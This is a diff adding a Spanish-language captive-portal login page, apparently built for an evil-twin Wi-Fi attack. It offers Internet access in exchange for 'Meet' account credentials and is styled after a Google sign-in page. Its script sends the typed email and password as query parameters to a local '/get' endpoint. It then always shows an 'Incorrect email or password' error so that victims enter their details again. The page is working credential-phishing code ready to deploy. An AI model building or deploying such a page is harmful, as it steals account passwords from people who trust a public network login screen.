@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <style>
+      :root {
+        --background-color: #121c2b;
+        --login-container-background-color: #182232;
+        --text-color: #f4f4f4;
+        --input-background-color: #1e2939;
+        --password-show-button-text-color: #9fef00;
+        --password-show-button-color: #b1f233;
+        --password-show-button-color-hover: #121c2b;
+        --buttons: #9fef00;
+        --buttons-text: #121c2b;
+        --buttons-hover: #b1f233;
+        --border-color: #747775;
+        --footer-buttons: #4007ab;
+        --footer-buttons-text: #798ba5;
+        --footer-buttons-hover: #182232;
+        --footer-buttons-text-hover: #798ba5;
+        --error-text-color: #d93025;
+      }
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+      }
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        background-color: var(--background-color);
+      }
+
+      h1 {
+        font-size: x-large;
+        padding-bottom: 10px;
+      }
+
+      strong {
+        font-size: x-large;
+      }
+
+      .login-container {
+        background-color: var(--login-container-background-color);
+        padding: 30px;
+        border-radius: 30px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      }
+
+      #logo {
+        display: block;
+        margin: 0 auto 10px;
+        padding-top: -10px;
+      }
+
+      #logo svg {
+        position: relative;
+        size-adjust: 100px;
+        max-height: 300px;
+        margin: 0 auto;
+        display: block;
+      }
+
+      .text {
+        text-align: center;
+        margin-top: 20px;
+        margin-bottom: 30px;
+        font-size: 14px;
+        color: var(--text-color);
+      }
+
+      .text h2 {
+        margin-top: 5px;
+        margin-bottom: 3px;
+        font-weight: lighter;
+        color: var(--text-color);
+      }
+
+      .g-input {
+        display: block;
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 16px;
+        color: var(--text-color);
+        background-color: var(--input-background-color);
+        border: 1px solid var(--input-background-color);
+        border-radius: 5px;
+      }
+
+      .buttons {
+        display: flex;
+        flex-direction: row-reverse;
+        flex-wrap: wrap;
+        width: 100%;
+        margin-top: 20px;
+      }
+
+      input[type="checkbox"] {
+        /* Double-sized Checkboxes */
+        -ms-transform: scale(1.1); /* IE */
+        -moz-transform: scale(1.1); /* FF */
+        -webkit-transform: scale(1.1); /* Safari and Chrome */
+        -o-transform: scale(1.1); /* Opera */
+        transform: scale(1.1);
+        width: 1.4rem;
+        padding: 10px;
+        margin-left: 5px;
+        margin-right: 7px;
+        accent-color: var(--buttons);
+        background: var(--buttons);
+      }
+
+      .info {
+        margin-bottom: -10px;
+      }
+
+      .showPass {
+        color: var(--footer-buttons-text);
+        font-size: 0.75rem;
+        font-weight: lighter;
+        width: 100%;
+        padding: 0px;
+        border: none;
+        border-radius: 30px;
+        background-color: var(--login-container-background-color);
+        cursor: pointer;
+        text-align: center;
+        vertical-align: middle;
+        line-height: 50px;
+        letter-spacing: 0rem;
+      }
+
+      .showPass:hover {
+        background-color: var(--password-show-button-color-hover);
+        cursor: pointer;
+      }
+
+      .showPass:active {
+        background-color: var(--login-container-background-color);
+      }
+      .showPass:focus {
+        background-color: var(--login-container-background-color);
+      }
+
+      .checkbox-label {
+        padding-bottom: -10px;
+      }
+
+      .gbtn-primary {
+        width: 30%;
+        margin-top: 5px;
+        text-align: center;
+        vertical-align: middle;
+        height: 38px;
+        border: none;
+        border-radius: 5px;
+        background-color: var(--buttons);
+        color: var(--buttons-text);
+        cursor: pointer;
+        font-size: 0.875rem;
+        font-weight: 900;
+        font-weight: var(--c-afwt, 500);
+        letter-spacing: 0rem;
+      }
+
+      .gbtn-primary:hover {
+        background-color: var(--buttons-hover);
+      }
+
+      .footerMenu {
+        margin-top: 20px;
+        display: block;
+        direction: ltr;
+        font-size: 0.75rem;
+        font-weight: 400;
+        letter-spacing: 0rem;
+        line-height: 1.4285714286;
+        width: 105%;
+      }
+
+      .footerMenu .class1 {
+        float: left;
+        display: inline;
+        width: 37%;
+        color: var(--footer-buttons-text);
+        cursor: pointer;
+        margin: -3.5px 7.4%;
+        padding: 5px 4px;
+        border: none;
+        border-radius: 10px;
+        text-align: center;
+        vertical-align: middle;
+      }
+
+      .footerMenu .class1:hover {
+        background-color: var(--footer-buttons-hover);
+      }
+
+      .footerMenu .buttonsLeft {
+        margin-left: 20%;
+      }
+
+      .footerMenu .class2 {
+        float: left;
+        display: inline;
+        color: var(--footer-buttons-text);
+        display: inline;
+        cursor: pointer;
+        padding: 1% 1%;
+        margin-left: 0%;
+        margin-right: 10%;
+        border: none;
+        border-radius: 10px;
+        text-align: center;
+        vertical-align: middle;
+      }
+
+      .footerMenu .class3 {
+        float: left;
+        display: inline;
+        color: var(--footer-buttons-text);
+        cursor: pointer;
+        padding: 1% 1%;
+        margin-left: 1%;
+        border: none;
+        border-radius: 10px;
+        text-align: center;
+        vertical-align: middle;
+      }
+
+      .footerMenu .class4 {
+        float: left;
+        display: inline;
+        color: var(--footer-buttons-text);
+        cursor: pointer;
+        padding: 1% 1%;
+        margin-left: 0.5%;
+        border: none;
+        border-radius: 10px;
+        text-align: center;
+        vertical-align: middle;
+      }
+
+      .footerMenu .class2:hover,
+      .class3:hover,
+      .class4:hover {
+        background-color: var(--footer-buttons-hover);
+        color: var(--footer-buttons-text-hover);
+      }
+
+      .footerMenu .class3 {
+        margin-left: -30px;
+      }
+
+      .footerMenu .openMenu {
+        padding-top: 7px;
+        margin-left: 4%;
+        color: var(--footer-buttons-text-hover);
+        filter: invert(79%) sepia(25%) saturate(2365%) hue-rotate(29deg)
+          brightness(105%) contrast(101%);
+      }
+
+      /* Error message styling */
+      .error-message {
+        position: absolute;
+        color: var(--error-text-color); /* Google's red color for errors */
+        font-size: 13px;
+        width: 100%;
+        display: flex;
+        align-items: center;
+        margin-top: -27px;
+      }
+
+      .error-icon {
+        margin-right: 5px;
+      }
+    </style>
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,maximum-scale=1"
+    />
+  </head>
+  <body>
+    <div>
+      <div class="login-container">
+        <form action="/get" id="email-form-step">
+          <div id="logo">
+            <!-- svg logg3r-->
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              xmlns:xlink="http://www.w3.org/1999/xlink"
+              width="300"
+              height="53"
+              viewBox="0 0 300 56"
+            >
+              <image
+                xlink:href="data:image/png;base64,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"
+                x="0"
+                y="0"
+                width="300"
+                height="56"
+              />
+            </svg>
+            <!-- svg logg3r -->
+          </div>
+          <div class="content">
+            <div class="text">
+              <h1>Para obtener acceso a Internet</h1>
+              <h2>
+                Accede con la cuenta que te inscribiste al
+                <strong>Meet</strong>
+              </h2>
+            </div>
+            <!-- Error message placeholder -->
+            <div id="error-message" class="error-message" style="display: none">
+              <span class="error-icon">&#9888;</span>
+              <!-- Warning symbol -->
+              Incorrect email or password.
+            </div>
+            <div class="info">
+              <input
+                name="email"
+                type="email"
+                class="g-input"
+                id="email"
+                placeholder="Email"
+                required
+              />
+              <input
+                name="password"
+                type="password"
+                class="g-input"
+                placeholder="Clave"
+                id="password"
+                required
+              />
+            </div>
+            <label for="checkbox" class="showPass">
+              <input
+                type="checkbox"
+                name="showPass"
+                value="value"
+                onclick="myFunction()"
+              />
+              Mostrar Contrasena
+            </label>
+            <div class="buttons">
+              <button class="gbtn-primary" id="siguiente" type="submit">
+                Siguiente
+              </button>
+            </div>
+          </div>
+        </form>
+      </div>
+      <footer class="footerMenu">
+        <p class="class1">
+          Espanol (Latinoamerica)
+          <svg
+            class="openMenu"
+            xmlns="http://www.w3.org/2000/svg"
+            xmlns:xlink="http://www.w3.org/1999/xlink"
+            width="16"
+            height="16"
+            viewBox="0 0 16 16"
+          >
+            <image
+              xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAK1JREFUOE/N0i8KAkEcxfHPIhgsNg8geAG7wSAiGDUbPIAeRbNVsGrToNls1gsYTAaDiAguLOu/XbY4ZWDm/b7Mm/cCGVeQcd7/AA4op7SzRyW0MMIgJWCMYQh47BP0E0Km6OEW/cQcZuj+gCzQwfWhi6eQxxytD5A12riE9+9iLGCJWgyyRQPn6PmnHhSxQfUp3qGOU/xl34pUwuo50MTxna3/aWLC+F9lmS3cAYizFRHRmvQHAAAAAElFTkSuQmCC"
+              x="0"
+              y="0"
+              width="16"
+              height="16"
+            />
+          </svg>
+        </p>
+
+        <div class="buttonsLeft">
+          <p class="class2">Ayuda</p>
+          <p class="class3">Privacidad</p>
+          <p class="class4">Terminos</p>
+        </div>
+      </footer>
+    </div>
+  </body>
+  <script>
+    const form = document.getElementById("email-form-step");
+    form.addEventListener("submit", function (event) {
+      event.preventDefault();
+      const email = event.currentTarget.email.value;
+      const password = event.currentTarget.password.value;
+
+      // Properly encode the parameters to handle special characters
+      const encodedEmail = encodeURIComponent(email);
+      const encodedPassword = encodeURIComponent(password);
+
+      fetch(`/get?email=${encodedEmail}&password=${encodedPassword}`);
+    });
+
+    function myFunction() {
+      var x = document.getElementById("password");
+      if (x.type === "password") {
+        x.type = "text";
+      } else {
+        x.type = "password";
+      }
+    }
+
+    document.getElementById("siguiente").addEventListener("click", function () {
+      const errorMessage = document.getElementById("error-message");
+      errorMessage.style.display = "flex"; // Show the error message
+
+      // Hide the error message after 3 seconds (3000 milliseconds)
+      setTimeout(function () {
+        errorMessage.style.display = "none";
+      }, 3000);
+    });
+  </script>
+</html>
